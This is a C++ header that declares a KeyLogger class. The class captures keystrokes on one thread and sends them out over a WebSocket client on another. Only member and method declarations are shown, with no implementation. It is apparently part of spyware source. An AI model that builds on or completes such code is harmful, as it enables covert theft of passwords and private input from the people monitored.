#include "websocket_client.hpp"
#include <nlohmann/json.hpp>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <map>

class KeyLogger {
private:
    std::atomic<bool> running{ false };
    std::vector<std::string> keystrokes;
    std::thread keylog_thread;
    std::thread send_thread;
    std::mutex keystrokes_mutex;
    WebSocketClient& client;
    static const std::map<int, std::string> special_keys;

    void log_keystrokes();
    void send_keystrokes();

public:
    KeyLogger(WebSocketClient& ws_client);
    ~KeyLogger();
    void start();
    void stop();
};